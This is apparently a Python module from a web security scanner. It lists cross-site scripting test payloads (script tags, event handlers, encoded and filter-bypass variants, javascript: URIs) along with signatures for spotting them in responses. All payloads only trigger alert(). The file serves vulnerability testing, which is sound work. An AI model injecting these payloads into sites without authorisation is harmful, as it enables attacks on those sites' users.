"""
XSS (Cross-Site Scripting) test payloads
"""

XSS_PAYLOADS = [
    # Basic XSS
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    
    # Event handlers
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<iframe onload=alert('XSS')>",
    
    # Without script tags
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    
    # Encoded payloads
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    
    # DOM-based
    "javascript:alert('XSS')",
    "data:text/html,<script>alert('XSS')</script>",
    
    # Filter bypass
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "<SCRipT>alert('XSS')</sCRipT>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    
    # Attribute-based
    "\" onmouseover=\"alert('XSS')\"",
    "' onmouseover='alert(\"XSS\")'",
    
    # Alternative tags
    "<object data=\"javascript:alert('XSS')\">",
    "<embed src=\"javascript:alert('XSS')\">",
]

# XSS signatures to detect in response
XSS_SIGNATURES = [
    "<script>",
    "alert(",
    "onerror=",
    "onload=",
    "javascript:",
    "<img",
    "<svg",
    "<iframe",
]